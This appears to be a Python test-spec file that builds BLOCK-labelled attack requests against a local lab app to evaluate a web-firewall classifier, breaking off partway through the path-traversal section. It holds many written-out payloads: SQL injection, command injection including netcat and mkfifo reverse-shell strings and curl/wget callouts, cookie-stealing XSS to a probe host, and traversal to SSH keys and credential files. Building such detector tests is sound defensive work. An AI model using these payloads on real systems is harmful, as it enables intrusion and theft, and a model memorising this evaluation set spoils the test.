"""External Test v1 — BLOCK-labelled security candidate specs (Phase C DRAFT).

These specs describe security-test requests authored AGAINST THE LAB APPLICATION'S OWN
routes, parameters and schema (docker/lab-app/app.py). They exist to test one thing:
whether V4 recognizes the intended attack category. They are:

  - local-lab only: every `host` is a lab alias, so the request only ever reaches lab-app;
  - inert at the application layer: the payload is a string in a query value, form field,
    JSON value, path segment, cookie or header. lab-app never interpolates it into a SQL
    query, a shell, a filesystem path, a template sink or an outbound fetch. An SSRF URL is
    payload TEXT in a parameter; nothing fetches it, and the request's destination stays a
    lab alias, so nothing leaves the lab;
  - semantically clear: each carries a decoded payload and a stated ground_truth_basis, so
    the BLOCK label is justified before V4 sees anything.

NOT copied from PayloadsAllTheThings (V4's training source at e961fef), not from the
real-http-fp-v1 diagnostic, not from the Docker smoke fixtures, not derived from any V4
prediction. App-specific authoring reduces reuse risk; it does NOT establish independence.
Independence is a Phase D gate result (protocol section 7), which is NOT run here.

Draft capacity is ~48/category (1.2x the final 40) so the Phase D gate can reject
collisions while keeping >= 30 support. Each row is a distinct logical test; a payload is
not duplicated across placements merely to reach the count.
"""

from __future__ import annotations

import json as _json_mod
from urllib.parse import quote

from spec_lib import Spec, SHOP_HOST, API_HOST


def enc(value: str) -> str:
    """Percent-encode a decoded payload for placement inside a query value, so the real
    client transmits it verbatim instead of re-encoding it unpredictably."""
    return quote(value, safe="")


# ── placement builders: each returns (method, host, path, placement, decoded) ──
def q_shop(param, decoded, route="/products"):
    return ("GET", SHOP_HOST, f"{route}?{param}={enc(decoded)}", "query", decoded)


def q_api(param, decoded, route="/api/products"):
    return ("GET", API_HOST, f"{route}?{param}={enc(decoded)}", "query", decoded)


def search_q(decoded):
    return ("GET", SHOP_HOST, f"/search?q={enc(decoded)}", "query", decoded)


def path_seg(decoded, route="/products"):
    return ("GET", SHOP_HOST, f"{route}/{enc(decoded)}", "path", decoded)


def static_seg(decoded):
    # lab-app /static/<path:asset> only echoes the asset name as text; no open() is called.
    return ("GET", SHOP_HOST, f"/static/{decoded}", "path", decoded)


def _mk(group, technique, built, description, *, body=None, body_type="none",
        client="curl", headers=None, payload=None, placement=None,
        confidence="high", review="auto-accepted") -> Spec:
    method, host, path, tuple_placement, decoded = built
    place = placement or tuple_placement
    pay = payload if payload is not None else decoded
    return Spec(
        group=group, expected_decision="BLOCK", client=client,
        method=method, host=host, path=path,
        technique=technique, description=description,
        ground_truth_basis=(f"Contains an intentionally security-relevant {group} pattern "
                             f"({technique}) in an inert {place}; lab-app stores/echoes it "
                             f"without executing it. BLOCK is the expected firewall "
                             f"decision, not exploitation."),
        payload_placement=place, payload=pay,
        body=body, body_type=body_type, headers=headers or [],
        label_confidence=confidence, review_status=review)


def _form(group, technique, route, host, field, decoded, description, *,
          confidence="high") -> Spec:
    body = f"{field}={enc(decoded)}"
    return Spec(
        group=group, expected_decision="BLOCK", client="curl", method="POST",
        host=host, path=route, technique=technique, description=description,
        ground_truth_basis=(f"Contains an intentionally security-relevant {group} pattern "
                             f"({technique}) in an inert form field {field!r}; lab-app does "
                             f"not interpolate it. BLOCK expected, not exploitation."),
        payload_placement="form", payload=decoded, body=body, body_type="form",
        headers=[("Content-Type", "application/x-www-form-urlencoded")],
        label_confidence=confidence)


def _json(group, technique, route, host, obj, decoded, description, *,
          confidence="high") -> Spec:
    body = _json_mod.dumps(obj, ensure_ascii=False)
    return Spec(
        group=group, expected_decision="BLOCK", client="httpx", method="POST",
        host=host, path=route, technique=technique, description=description,
        ground_truth_basis=(f"Contains an intentionally security-relevant {group} pattern "
                             f"({technique}) in an inert JSON value; lab-app echoes keys "
                             f"only. BLOCK expected, not exploitation."),
        payload_placement="json", payload=decoded, body=body, body_type="json",
        headers=[("Content-Type", "application/json")], label_confidence=confidence)


# ══════════════════════════════════════════════════════════════════════════
# SQL injection — dialects x techniques x injection points (all inert)
# ══════════════════════════════════════════════════════════════════════════
def sqli() -> list[Spec]:
    g = "sqli"
    S = []
    # boolean-based tautologies (the smoke fixture "1' OR '1'='1" is deliberately NOT reused)
    S += [
        _mk(g, "boolean-tautology", q_shop("category", "office' OR 'a'='a"),
            "Boolean tautology closing the category string literal"),
        _mk(g, "boolean-numeric", q_shop("page", "1 OR 7=7"),
            "Numeric-context boolean injection in pagination"),
        _mk(g, "boolean-paren", search_q("mug') OR ('x'='x"),
            "Parenthesis-balanced boolean break-out in search"),
        _mk(g, "boolean-double-quote", q_api("category", 'food" OR "1"="1'),
            "Double-quote boolean tautology on the API filter"),
        _mk(g, "auth-bypass-comment", q_shop("sort", "id'-- -"),
            "Comment-terminated break in the sort parameter"),
    ]
    # union-based (distinct column counts / functions / dialects)
    S += [
        _mk(g, "union-select", q_shop("category", "office' UNION SELECT NULL,NULL,NULL-- -"),
            "UNION SELECT with three NULL columns"),
        _mk(g, "union-version", q_shop("category", "x' UNION SELECT @@version,2,3-- -"),
            "UNION extracting @@version"),
        _mk(g, "union-users", search_q("x' UNION SELECT username,password FROM users-- -"),
            "UNION against a users table via search"),
        _mk(g, "union-postgres", q_api("category", "x' UNION SELECT current_database(),NULL-- -"),
            "UNION with current_database() (PostgreSQL)"),
        _mk(g, "union-concat", q_shop("sort", "price' UNION SELECT group_concat(name),2 FROM products-- -"),
            "UNION with group_concat over products"),
    ]
    # error-based (dialect-specific error functions)
    S += [
        _mk(g, "error-updatexml", q_shop("category", "x' AND updatexml(1,concat(0x7e,version()),1)-- -"),
            "MySQL error-based updatexml"),
        _mk(g, "error-extractvalue", q_shop("category", "x' AND extractvalue(1,concat(0x7e,user()))-- -"),
            "MySQL error-based extractvalue"),
        _mk(g, "error-cast-postgres", q_api("category", "x' AND 1=cast(current_user as int)-- -"),
            "PostgreSQL cast error-based"),
        _mk(g, "error-convert-mssql", search_q("x' AND 1=convert(int,@@version)-- -"),
            "MSSQL convert() error-based"),
    ]
    # stacked / DDL-DML (inert text; lab-app has no database)
    S += [
        _mk(g, "stacked-drop", q_shop("category", "office'; DROP TABLE products-- -"),
            "Stacked query dropping products"),
        _mk(g, "stacked-update", q_shop("category", "x'; UPDATE users SET role='admin' WHERE id=1-- -"),
            "Stacked privilege-escalation UPDATE"),
        _mk(g, "stacked-insert", q_shop("category", "x'; INSERT INTO users(name) VALUES('z')-- -"),
            "Stacked INSERT"),
    ]
    # time-based blind across dialects
    S += [
        _mk(g, "time-mysql-sleep", q_shop("category", "x' AND SLEEP(5)-- -"),
            "MySQL time-based SLEEP"),
        _mk(g, "time-postgres", q_api("category", "x' AND pg_sleep(5)-- -"),
            "PostgreSQL time-based pg_sleep"),
        _mk(g, "time-mssql-waitfor", search_q("x'; WAITFOR DELAY '0:0:5'-- -"),
            "MSSQL time-based WAITFOR DELAY"),
        _mk(g, "time-oracle", q_shop("category", "x' AND 1=dbms_pipe.receive_message('a',5)-- -"),
            "Oracle time-based dbms_pipe"),
        _mk(g, "time-benchmark", q_shop("category", "x' OR BENCHMARK(5000000,MD5(1))-- -"),
            "MySQL BENCHMARK time delay"),
    ]
    # comment / whitespace obfuscation styles
    S += [
        _mk(g, "comment-hash", q_shop("category", "office'#"),
            "MySQL hash comment terminator"),
        _mk(g, "comment-inline", q_shop("category", "office'/**/OR/**/1=1-- -"),
            "Inline-comment whitespace obfuscation"),
        _mk(g, "comment-mssql", q_shop("category", "office';-- comment"),
            "MSSQL double-dash comment"),
    ]
    # information_schema / metadata enumeration
    S += [
        _mk(g, "info-schema-tables", q_shop("category", "x' UNION SELECT table_name,2 FROM information_schema.tables-- -"),
            "information_schema.tables enumeration"),
        _mk(g, "info-schema-columns", search_q("x' UNION SELECT column_name,2 FROM information_schema.columns-- -"),
            "information_schema.columns enumeration"),
        _mk(g, "sqlite-master", q_api("category", "x' UNION SELECT name,sql FROM sqlite_master-- -"),
            "SQLite sqlite_master enumeration"),
    ]
    # ORDER BY / GROUP BY / LIMIT / HAVING injection (context-appropriate params)
    S += [
        _mk(g, "orderby-subquery", q_shop("sort", "(SELECT CASE WHEN(1=1) THEN name ELSE price END)"),
            "Conditional expression in ORDER BY position"),
        _mk(g, "orderby-numeric", q_shop("sort", "1,(SELECT 1 FROM products)"),
            "ORDER BY ordinal with subquery"),
        _mk(g, "limit-injection", q_shop("limit", "10 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,VERSION())),1)"),
            "LIMIT-clause PROCEDURE ANALYSE error injection"),
        _mk(g, "having-injection", q_shop("category", "x' GROUP BY 1 HAVING 1=1-- -"),
            "GROUP BY / HAVING injection"),
    ]
    # blind / subquery
    S += [
        _mk(g, "subquery-blind", q_shop("category", "x' AND (SELECT SUBSTRING(version(),1,1))='5'-- -"),
            "Blind substring version fingerprint"),
        _mk(g, "subquery-exists", q_api("category", "x' AND EXISTS(SELECT 1 FROM users)-- -"),
            "EXISTS subquery boolean blind"),
    ]
    # injection-point diversity: form / JSON / path / cookie
    S += [
        _form(g, "form-login-username", "/login", SHOP_HOST, "username", "admin'-- -",
              "Auth-bypass comment in the login username field"),
        _form(g, "form-login-or", "/login", SHOP_HOST, "username", "admin' OR '1'='1'-- -",
              "Boolean tautology in login username"),
        _form(g, "form-cart-qty", "/cart", SHOP_HOST, "quantity", "1' OR SLEEP(3)-- -",
              "Time-based injection in the cart quantity field"),
        _form(g, "form-checkout-addr", "/checkout", SHOP_HOST, "address",
              "12 St'; DROP TABLE orders-- -", "Stacked DDL in the checkout address"),
        _json(g, "json-order-id", "/api/orders", API_HOST,
              {"product_id": "1 OR product_id>0", "quantity": 1}, "1 OR product_id>0",
              "Boolean injection in a JSON order product_id"),
        _json(g, "json-order-union", "/api/orders", API_HOST,
              {"coupon": "x' UNION SELECT card FROM cards-- -"},
              "x' UNION SELECT card FROM cards-- -", "UNION in a JSON coupon value"),
        _mk(g, "path-id-injection", path_seg("1 AND 1=2 UNION SELECT 1"),
            "Injection in the /products/<id> path segment"),
        _mk(g, "cookie-session-inject", q_shop("category", "office"),
            "Boolean injection carried in the session cookie",
            headers=[("Cookie", "fwlab_session=u=admin' OR '1'='1")],
            payload="u=admin' OR '1'='1", placement="cookie"),
    ]
    # additional distinct techniques / functions
    S += [
        _mk(g, "like-injection", q_shop("category", "office%' AND '1'='1"),
            "LIKE-clause injection"),
        _mk(g, "in-clause", q_shop("category", "office') OR 1 IN (SELECT 1)-- -"),
            "IN() subquery injection"),
        _mk(g, "hex-literal", q_shop("category", "0x6f6666696365 OR 1=1-- -"),
            "Hex-literal value injection"),
        _mk(g, "bit-blind", search_q("x' AND ORD(MID(version(),1,1))>52-- -"),
            "Bitwise blind version extraction"),
        _mk(g, "mssql-xp-cmdshell", q_shop("category", "x'; EXEC xp_cmdshell('whoami')-- -"),
            "MSSQL xp_cmdshell stacked (inert text)"),
        _mk(g, "outfile", q_shop("category", "x' UNION SELECT 1 INTO OUTFILE '/tmp/x'-- -"),
            "INTO OUTFILE file write (inert text)"),
        _mk(g, "load-file", search_q("x' UNION SELECT LOAD_FILE('/etc/passwd')-- -"),
            "LOAD_FILE file read (inert text)"),
        _mk(g, "pg-read-file", q_api("category", "x' UNION SELECT pg_read_file('/etc/passwd')-- -"),
            "PostgreSQL pg_read_file (inert text)"),
    ]
    return S


# ══════════════════════════════════════════════════════════════════════════
# Command injection — operators x binaries x placements (never reaches a shell)
# ══════════════════════════════════════════════════════════════════════════
def cmdi() -> list[Spec]:
    g = "cmdi"
    S = []
    # shell metacharacter chaining, distinct operators + binaries
    S += [
        _mk(g, "semicolon-id", q_shop("category", "office; id"),
            "Semicolon command separator with id"),
        _mk(g, "and-whoami", q_shop("category", "office && whoami"),
            "AND-chained whoami"),
        _mk(g, "or-uname", q_shop("category", "office || uname -a"),
            "OR-chained uname"),
        _mk(g, "pipe-cat-passwd", search_q("mug | cat /etc/passwd"),
            "Pipe to cat /etc/passwd"),
        _mk(g, "background-sleep", q_shop("category", "office & sleep 5"),
            "Backgrounded sleep for timing"),
        _mk(g, "newline-ls", q_shop("category", "office\nls -la"),
            "Newline-injected ls"),
        _mk(g, "cr-nl-id", q_shop("category", "office\r\nid"),
            "CRLF-injected id"),
    ]
    # command substitution
    S += [
        _mk(g, "subst-dollar", search_q("$(id)"),
            "Command substitution $(id)"),
        _mk(g, "subst-backtick", q_shop("category", "office`id`"),
            "Backtick command substitution"),
        _mk(g, "subst-nested", q_shop("category", "office$(cat /etc/passwd)"),
            "Nested substitution reading passwd"),
    ]
    # IFS / whitespace-evasion styles
    S += [
        _mk(g, "ifs-cat", q_shop("category", "office;cat${IFS}/etc/passwd"),
            "${IFS} whitespace-evasion cat"),
        _mk(g, "ifs-ls", search_q(";ls${IFS}-la${IFS}/"),
            "${IFS}-separated ls"),
        _mk(g, "brace-expansion", q_shop("category", "office;{cat,/etc/passwd}"),
            "Brace-expansion argument passing"),
    ]
    # network / OOB commands as INERT TEXT (the string never executes; host stays in-lab)
    S += [
        _mk(g, "oob-curl", q_shop("category", "office; curl http://collector.internal/x"),
            "Chained curl (inert text, not executed)"),
        _mk(g, "oob-wget", q_shop("category", "office; wget http://collector.internal/x -O-"),
            "Chained wget (inert text)"),
        _mk(g, "oob-nslookup", search_q("; nslookup probe.internal"),
            "Chained nslookup for OOB DNS (inert text)"),
        _mk(g, "oob-ping", q_shop("category", "office; ping -c 5 127.0.0.1"),
            "Chained ping for timing (inert text)"),
    ]
    # windows-flavoured
    S += [
        _mk(g, "win-amp-dir", q_shop("category", "office & dir"),
            "Windows & dir"),
        _mk(g, "win-type", q_shop("category", "office | type C:\\Windows\\win.ini"),
            "Windows type of win.ini"),
        _mk(g, "win-powershell", search_q("; powershell -c Get-Process"),
            "PowerShell one-liner (inert text)"),
        _mk(g, "win-ipconfig", q_shop("category", "office && ipconfig /all"),
            "Windows ipconfig"),
    ]
    # interpreter one-liners as text
    S += [
        _mk(g, "python-oneliner", q_shop("category", "office; python3 -c 'import os;os.system(\"id\")'"),
            "Python one-liner (inert text)"),
        _mk(g, "perl-cmd", search_q("; perl -e 'system(\"id\")'"),
            "Perl system() one-liner (inert text)"),
        _mk(g, "bash-i", q_shop("category", "office; bash -i"),
            "Interactive bash invocation (inert text)"),
    ]
    # placements: form / json / path / header / cookie
    S += [
        _form(g, "form-checkout-addr", "/checkout", SHOP_HOST, "address",
              "12 St; cat /etc/passwd", "Semicolon cat in checkout address"),
        _form(g, "form-cart-qty", "/cart", SHOP_HOST, "quantity", "1;id",
              "Command separator in cart quantity"),
        _form(g, "form-login-user", "/login", SHOP_HOST, "username", "guest|whoami",
              "Pipe whoami in login username"),
        _json(g, "json-order-note", "/api/orders", API_HOST,
              {"product_id": 1, "note": "$(cat /app/config.yaml)"}, "$(cat /app/config.yaml)",
              "Command substitution reading the app config in a JSON note"),
        _json(g, "json-order-ref", "/api/orders", API_HOST,
              {"ref": "x`uname -a`"}, "x`uname -a`",
              "Backtick substitution in a JSON ref"),
        _mk(g, "path-seg-cmd", path_seg("1;id"),
            "Command separator in the product path segment"),
        _mk(g, "header-ua-shellshock", q_shop("category", "office"),
            "Shellshock-style function in a User-Agent header",
            headers=[("User-Agent", "() { :; }; /bin/id")], payload="() { :; }; /bin/id",
            placement="header", confidence="medium", review="needs-review"),
        _mk(g, "cookie-cmd", q_shop("category", "office"),
            "Command separator carried in a cookie",
            headers=[("Cookie", "fwlab_cart=1;$(id)")], payload="1;$(id)",
            placement="cookie"),
    ]
    # encoded query variants (recognition of encoded operators)
    S += [
        _mk(g, "enc-semicolon", q_shop("category", "office%3Bid"),
            "Percent-encoded semicolon separator", payload="office;id"),
        _mk(g, "enc-pipe", search_q("mug%7Cwhoami"),
            "Percent-encoded pipe", payload="mug|whoami"),
        _mk(g, "double-enc", q_shop("category", "office%2526%2526id"),
            "Double-encoded && operator", payload="office&&id", confidence="medium"),
    ]
    # additional distinct binaries / operators / redirection
    S += [
        _mk(g, "read-shadow", q_shop("category", "office; cat /etc/shadow"),
            "Chained cat of /etc/shadow"),
        _mk(g, "env-dump", search_q("; env"),
            "Chained env dump"),
        _mk(g, "netstat", q_shop("category", "office && netstat -an"),
            "Chained netstat"),
        _mk(g, "ps-aux", q_shop("category", "office; ps aux"),
            "Chained process list"),
        _mk(g, "hostname-id", search_q("; hostname; id"),
            "Chained hostname and id"),
        _mk(g, "find-suid", q_shop("category", "office; find / -perm -4000 -type f"),
            "Chained SUID find"),
        _mk(g, "redirect-out", q_shop("category", "office; id > /tmp/o 2>&1"),
            "Chained command with output redirection"),
        _mk(g, "process-subst", search_q("; bash <(echo id)"),
            "Process-substitution invocation (inert text)"),
        _mk(g, "here-string", q_shop("category", "office; bash <<< id"),
            "Here-string bash invocation (inert text)"),
        _mk(g, "nc-reverse", q_shop("category", "office; nc -e /bin/sh 10.0.0.9 4444"),
            "Netcat reverse-shell string (inert text)"),
        _mk(g, "mkfifo-reverse", search_q("; mkfifo /tmp/f;cat /tmp/f|sh"),
            "mkfifo reverse-shell string (inert text)"),
        _mk(g, "base64-decode", q_shop("category", "office; echo aWQ=|base64 -d|sh"),
            "base64-decode-pipe-sh string (inert text)"),
        _mk(g, "cat-app-config", q_shop("category", "office; cat /app/data_plane/data_plane.py"),
            "Chained read of the data-plane source (inert text)"),
    ]
    return S


# ══════════════════════════════════════════════════════════════════════════
# Cross-site scripting — vectors x sinks x placements (captured by curl/httpx;
# never rendered by a browser in Phase C, so nothing executes)
# ══════════════════════════════════════════════════════════════════════════
def xss() -> list[Spec]:
    """Distinct decoded payloads with app-specific sinks (fwlab markers, lab routes) so no
    two collapse to one canonical key and none reuses a textbook training string."""
    g = "xss"
    S = []
    # <script> element, distinct sinks
    S += [
        _mk(g, "script-domain", search_q("<script>alert('fwlab:'+document.domain)</script>"),
            "script element leaking document.domain with a lab marker"),
        _mk(g, "script-fetch-api", search_q("<script>fetch('/api/me').then(r=>r.text())</script>"),
            "script fetching the lab /api/me route"),
        _mk(g, "script-beacon", q_shop("category", "<script>navigator.sendBeacon('/collect',document.cookie)</script>"),
            "script beaconing the session cookie"),
        _mk(g, "script-image-exfil", search_q("<script>new Image().src='//probe.fwlab.test/c?'+document.cookie</script>"),
            "script exfiltrating cookie via image to a lab probe host"),
        _mk(g, "script-src-ext", search_q("<script src=//probe.fwlab.test/x.js></script>"),
            "external script include from a lab probe host"),
        _mk(g, "svg-script", search_q("<svg><script>alert('fwlab-svg')</script></svg>"),
            "svg-namespaced script element"),
        _mk(g, "eval-atob", search_q("<script>eval(atob('ZndsYWItYjY0'))</script>"),
            "base64-eval script (decodes to a lab marker)"),
    ]
    # event handlers on distinct tags, distinct sinks
    S += [
        _mk(g, "img-onerror-domain", q_shop("category", "<img src=x onerror=alert(document.domain)>"),
            "img onerror leaking document.domain"),
        _mk(g, "img-onerror-fetch", search_q("<img src=y onerror=fetch('/cart')>"),
            "img onerror fetching the lab /cart route"),
        _mk(g, "img-srcset", q_shop("category", "<img srcset=z onerror=alert('fwlab-srcset')>"),
            "img srcset onerror handler"),
        _mk(g, "svg-onload-title", search_q("<svg onload=document.title='fwlab-xss'>"),
            "svg onload rewriting the title"),
        _mk(g, "svg-onload-name", q_shop("category", "<svg onload=window.name='fwlab-win'>"),
            "svg onload setting window.name"),
        _mk(g, "body-onload-print", search_q("<body onload=print()>"),
            "body onload invoking print()"),
        _mk(g, "details-ontoggle", q_shop("category", "<details open ontoggle=confirm('fwlab-dt')>"),
            "details ontoggle handler"),
        _mk(g, "video-onerror", search_q("<video src=1 onerror=alert(document.cookie)>"),
            "video onerror leaking cookie"),
        _mk(g, "audio-onerror", search_q("<audio src=1 onerror=location='//probe.fwlab.test'>"),
            "audio onerror navigating to a lab probe host"),
        _mk(g, "input-onfocus", q_shop("category", "<input autofocus onfocus=alert(origin)>"),
            "input autofocus onfocus leaking origin"),
        _mk(g, "select-onfocus", q_shop("category", "<select autofocus onfocus=eval(name)>"),
            "select autofocus onfocus eval(name)"),
        _mk(g, "keygen-onfocus", search_q("<keygen autofocus onfocus=alert('fwlab-kg')>"),
            "keygen autofocus onfocus handler"),
        _mk(g, "marquee-onstart", search_q("<marquee onstart=alert('fwlab-mq')>"),
            "marquee onstart handler"),
        _mk(g, "onpointerover", search_q("<div onpointerover=alert('fwlab-pov')>x</div>"),
            "onpointerover event handler"),
        _mk(g, "onanimationstart", q_shop("category",
            "<style>@keyframes fw{}</style><b style=animation-name:fw onanimationstart=alert('fwlab-anim')>x</b>"),
            "CSS-animation onanimationstart handler"),
    ]
    # javascript: URIs on distinct elements
    S += [
        _mk(g, "object-data-js", q_shop("category", "<object data=javascript:alert('fwlab-obj')>"),
            "object data javascript URI"),
        _mk(g, "embed-src-js", q_shop("category", "<embed src=javascript:alert('fwlab-emb')>"),
            "embed src javascript URI"),
        _mk(g, "a-href-js", q_shop("category", "<a href=javascript:alert('fwlab-a')>link</a>"),
            "anchor href javascript URI"),
        _mk(g, "base-href-js", search_q("<base href=javascript:alert('fwlab-base')//>"),
            "base href javascript URI"),
        _mk(g, "meta-refresh-js", q_shop("category",
            "<meta http-equiv=refresh content=0;url=javascript:alert('fwlab-mr')>"),
            "meta refresh javascript URI"),
        _mk(g, "form-action-js", q_shop("category",
            "<form action=javascript:alert('fwlab-frm')><button>x</button></form>"),
            "form action javascript URI"),
        _mk(g, "math-xlink-js", search_q("<math><maction xlink:href=javascript:alert('fwlab-math')>x</maction></math>"),
            "MathML xlink javascript URI"),
        _mk(g, "isindex-js", q_shop("category", "<isindex action=javascript:alert('fwlab-idx') type=submit>"),
            "isindex action javascript URI"),
        _mk(g, "table-bg-js", q_shop("category", "<table background=javascript:alert('fwlab-tbl')>"),
            "table background javascript URI"),
        _mk(g, "js-uri-plain", q_shop("category", "javascript:alert(document.domain)"),
            "bare javascript: URI value"),
        _mk(g, "iframe-data-uri", q_shop("category", "<iframe src=data:text/html,<script>alert('fwlab-du')</script>>"),
            "iframe data: URI document"),
        _mk(g, "iframe-srcdoc", q_shop("category", "<iframe srcdoc=<svg/onload=alert('fwlab-sd')>>"),
            "iframe srcdoc handler"),
    ]
    # style / import / expression
    S += [
        _mk(g, "style-import", q_shop("category", "<style>@import'//probe.fwlab.test/a.css'</style>"),
            "style @import from a lab probe host"),
        _mk(g, "div-style-expression", q_shop("category", "<div style=width:expression(alert('fwlab-expr'))>x</div>"),
            "legacy CSS expression() sink"),
    ]
    # context break-outs
    S += [
        _mk(g, "attr-dq-breakout", q_shop("category", 'office" onmouseover="alert(document.domain)'),
            "double-quote attribute break-out"),
        _mk(g, "attr-sq-breakout", q_shop("category", "office' onmouseover='alert(origin)"),
            "single-quote attribute break-out"),
        _mk(g, "textarea-break", search_q("</textarea><script>alert('fwlab-ta')</script>"),
            "textarea close then script"),
        _mk(g, "title-break", search_q("</title><script>alert('fwlab-ti')</script>"),
            "title close then script"),
        _mk(g, "comment-break", q_shop("category", "--><script>alert('fwlab-cmt')</script>"),
            "HTML-comment close then script"),
        _mk(g, "dom-hash", search_q("#<img src=q onerror=alert('fwlab-dom')>"),
            "DOM-style payload in a query value"),
        _mk(g, "polyglot", search_q("jaVasCript:/*-/*`/*fwlab*/(/**/oNcliCk=alert('fwlab-pg') )//"),
            "case/comment XSS polyglot with a lab marker"),
    ]
    # placements: form / json / path / cookie / header
    S += [
        _form(g, "form-login-user", "/login", SHOP_HOST, "username", "<script>alert('fwlab-login')</script>",
              "stored-style script in the login username field"),
        _form(g, "form-checkout-addr", "/checkout", SHOP_HOST, "address",
              "<img src=x onerror=alert('fwlab-co')>", "img onerror in checkout address"),
        _form(g, "form-cart", "/cart", SHOP_HOST, "product_id", "<svg onload=alert('fwlab-cart')>",
              "svg onload in cart product_id"),
        _json(g, "json-order-note", "/api/orders", API_HOST,
              {"note": "<script>alert('fwlab-json')</script>"}, "<script>alert('fwlab-json')</script>",
              "script tag in a JSON note"),
        _json(g, "json-order-label", "/api/orders", API_HOST,
              {"label": '\"><img src=x onerror=alert(location)>'},
              '\"><img src=x onerror=alert(location)>', "attribute break-out in a JSON label"),
        _mk(g, "path-seg-xss", path_seg("<svg/onload=alert('fwlab-path')>"),
            "handler in the /products/<id> path segment"),
        _mk(g, "referer-xss", q_shop("category", "office"),
            "script payload carried in the Referer header",
            headers=[("Referer", "http://x.test/<script>alert('fwlab-ref')</script>")],
            payload="<script>alert('fwlab-ref')</script>", placement="header",
            confidence="medium", review="needs-review"),
        _mk(g, "cookie-xss", q_shop("category", "office"),
            "handler payload carried in a cookie",
            headers=[("Cookie", "fwlab_session=<img src=x onerror=alert('fwlab-ck')>")],
            payload="<img src=x onerror=alert('fwlab-ck')>", placement="cookie"),
    ]
    return S


def path_traversal() -> list[Spec]:
    """Distinct decoded targets, heavy on lab/app-specific paths, with varied encodings so
    no two collapse to one canonical key. No real filesystem access occurs; lab-app only
    echoes the value as text."""
    g = "path-traversal"
    S = []
    # lab / app source and config files (plain ../), each target distinct
    lab_targets = [
        ("app-py", "../../app.py", "the lab-app source"),
        ("labapp-src", "../../docker/lab-app/app.py", "the lab-app package source"),
        ("root-config", "../../config.yaml", "the repo root config"),
        ("docker-config", "../../docker/config.docker.yaml", "the docker data-plane config"),
        ("requirements", "../../requirements.txt", "the requirements file"),
        ("compose", "../../compose.yaml", "the compose file"),
        ("dotenv", "../../.env", "a dotenv file"),
        ("dataplane-src", "../../data_plane/data_plane.py", "the data-plane source"),
        ("inference-core", "../../control_plane/inference_core.py", "the inference core"),
        ("wire-src", "../../scripts/external/wire.py", "the wire module"),
        ("capture-addon", "../../scripts/external/capture_addon.py", "the capture addon"),
        ("v4-eval", "../../datasets/v4_clean/eval.jsonl", "the V4 eval split"),
        ("adapter-config", "../../model-output-v4-clean/adapter_config.json", "the adapter config"),
        ("access-log", "../../docker/.lab-logs/lab-app-access.jsonl", "the lab receipt log"),
        ("lab-readme", "../../reports/lab/README.md", "a lab report"),
        ("labapp-dockerfile", "../../docker/lab-app/Dockerfile", "the lab-app Dockerfile"),
        ("git-config", "../../.git/config", "the git config"),
        ("decisions", "../../DECISIONS.md", "the decisions log"),
    ]
    for tech, tgt, desc in lab_targets:
        S.append(_mk(g, f"lab-{tech}", q_shop("category", tgt),
                     f"../ traversal to {desc}"))
    # system files, distinct non-canonical targets
    sys_targets = [
        ("etc-group", search_q, "../../../../etc/group", "/etc/group"),
        ("etc-hostname", q_shop, "../../../../etc/hostname", "/etc/hostname"),
        ("os-release", q_shop, "../../../../etc/os-release", "/etc/os-release"),
        ("crontab", search_q, "../../../../etc/crontab", "/etc/crontab"),
        ("nginx-conf", q_shop, "../../../../etc/nginx/nginx.conf", "the nginx config"),
        ("proc-environ", q_shop, "../../../../proc/self/environ", "/proc/self/environ"),
        ("proc-cmdline", search_q, "../../../../proc/self/cmdline", "/proc/self/cmdline"),
        ("proc-version", q_shop, "../../../../proc/version", "/proc/version"),
        ("proc-net-tcp", search_q, "../../../../proc/net/tcp", "/proc/net/tcp"),
        ("bash-history", q_shop, "../../../../root/.bash_history", "a shell history"),
        ("ssh-key", search_q, "../../../../root/.ssh/id_rsa", "an SSH private key"),
        ("auth-log", q_shop, "../../../../var/log/auth.log", "the auth log"),
        ("sshd-config", search_q, "../../../../etc/ssh/sshd_config", "the sshd config"),
        ("web-inf", q_shop, "../../WEB-INF/web.xml", "WEB-INF/web.xml"),
        ("gshadow", q_shop, "../../../../etc/gshadow", "/etc/gshadow"),
        ("resolv-conf", q_shop, "../../../../etc/resolv.conf", "/etc/resolv.conf"),
    ]
    for tech, builder, tgt, desc in sys_targets:
        S.append(_mk(g, f"sys-{tech}", builder("category", tgt) if builder is q_shop else builder(tgt),
                     f"../ traversal to {desc}"))
    # encoding variants, each over a DISTINCT target so decoded forms stay unique
    S += [
        _mk(g, "enc-machine-id", q_shop("category", "..%2f..%2fetc%2fmachine-id"),
            "percent-encoded slashes to /etc/machine-id", payload="../../etc/machine-id"),
        _mk(g, "double-enc-login-defs", q_shop("category", "..%252f..%252fetc%252flogin.defs"),
            "double-encoded slashes to /etc/login.defs", payload="../../etc/login.defs",
            confidence="medium"),
        _mk(g, "backslash-system-ini", q_shop("category", "..\\..\\..\\windows\\system.ini"),
            "backslash traversal to system.ini"),
        _mk(g, "enc-backslash-repair-sam", search_q("..%5c..%5cwindows%5crepair%5csam"),
            "encoded backslash traversal to the repair SAM", payload="..\\..\\windows\\repair\\sam"),
        _mk(g, "doubled-dot-subuid", q_shop("category", "....//....//etc/subuid"),
            "doubled-dot bypass to /etc/subuid"),
        _mk(g, "semicolon-sources-list", q_shop("category", "..;/..;/..;/etc/apt/sources.list"),
            "semicolon path-segment bypass to sources.list"),
        _mk(g, "mixed-slash-keys", search_q("..%2f..\\..%2fopt/lab/keys.pem"),
            "mixed forward/back slash to a lab key", payload="../..\\../opt/lab/keys.pem"),
        _mk(g, "deep-docker", q_shop("category", "../" * 10 + "var/lib/docker/containers"),
            "deep repeated traversal to the docker root"),
        _mk(g, "ads-app", q_shop("category", "../../docker/lab-app/app.py::$DATA"),
            "NTFS alternate-data-stream suffix on the app source", confidence="medium"),
        _mk(g, "tilde-secret", search_q("~/../../var/lib/lab/secret.key"),
            "tilde home-relative traversal to a lab secret"),
        _mk(g, "unc-fileserver", q_shop("category", "\\\\lab-fileserver.internal\\share\\backup"),
            "UNC path to a lab file server (inert)"),
    ]
    # absolute references, distinct
    S += [
        _mk(g, "absolute-adapter", search_q("/opt/firewall-ia/adapter/adapter_config.json"),
            "absolute path to the lab adapter config"),
        _mk(g, "absolute-win-system", q_shop("category", "C:\\Windows\\System32\\config\\SYSTEM"),
            "absolute Windows SYSTEM hive path"),
    ]
    # placements: static path, product path segment, form, json, api
    S += [
        _mk(g, "static-sha", static_seg("..%2f..%2freports%2flab%2fSHA256SUMS"),
            "traversal in /static/<asset> to a lab checksum file",
            payload="../../reports/lab/SHA256SUMS"),
